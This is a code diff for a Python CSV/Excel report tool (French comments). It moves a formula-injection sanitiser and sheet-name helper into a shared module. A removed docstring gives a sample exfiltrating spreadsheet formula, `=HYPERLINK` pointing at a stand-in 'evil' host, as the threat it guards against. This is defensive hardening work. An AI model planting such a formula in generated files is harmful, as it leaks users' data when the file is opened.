@@ -16,28 +16,11 @@ from pptx import Presentation
 from pptx.util import Inches, Pt
 from pptx.dml.color import RGBColor
 
+from agent.tools.spreadsheet_safety import neutralize_formulas, unique_sheet_title
+
 DATE_KEYWORDS = ["date", "time", "jour", "mois", "annee", "année", "year"]
 DECIMAL_PATTERN = re.compile(r"^-?\d+,\d+$")
 LEADING_ZERO_PATTERN = re.compile(r"^0\d")
-FORMULA_PREFIX_CHARS = ("=", "+", "-", "@", "\t", "\r")
-
-
-def neutralize_formulas(df: pd.DataFrame) -> pd.DataFrame:
-    """Empêche l'injection de formule CSV/Excel (CWE-1236).
-
-    Les fichiers CSV/XLSX exportés reproduisent tel quel le contenu du CSV
-    téléversé (non fiable). Une cellule texte commençant par =, +, -, @, tab
-    ou retour chariot est interprétée comme une formule par Excel/LibreOffice
-    à l'ouverture — ex. `=HYPERLINK("http://evil/"&A1)` peut exfiltrer des
-    données dès l'ouverture du fichier. On préfixe ces valeurs d'une apostrophe,
-    convention standard qui force leur traitement en texte.
-    """
-    df = df.copy()
-    for col in df.select_dtypes(include=["object", "str"]).columns:
-        df[col] = df[col].map(
-            lambda v: f"'{v}" if isinstance(v, str) and v.startswith(FORMULA_PREFIX_CHARS) else v
-        )
-    return df
 
 
 def read_csv_robust(uploaded_file) -> tuple[pd.DataFrame, str]:
@@ -162,16 +145,13 @@ def clean_data(df: pd.DataFrame) -> tuple[pd.DataFrame, dict]:
 
 
 def sanitize_sheet_name(name: str, used: set) -> str:
-    """Rend un nom de fichier compatible avec les contraintes de nom d'onglet Excel (31 car., uniques)."""
-    base = re.sub(r"[:\\/?*\[\]]", "_", name.rsplit(".", 1)[0])[:31] or "Feuille"
-    candidate = base
-    i = 2
-    while candidate in used:
-        suffix = f"_{i}"
-        candidate = base[: 31 - len(suffix)] + suffix
-        i += 1
-    used.add(candidate)
-    return candidate
+    """Dérive un nom d'onglet Excel valide et unique à partir d'un nom de fichier.
+
+    Retire l'extension puis délègue à unique_sheet_title() pour la partie
+    commune avec le mode agent (troncature à 31 caractères, caractères
+    interdits, dédoublonnage).
+    """
+    return unique_sheet_title(name.rsplit(".", 1)[0], used)
 
 
 def build_markdown_report(query: str, model_used: str, files: list, analysis_text: str, timestamp: str) -> str:
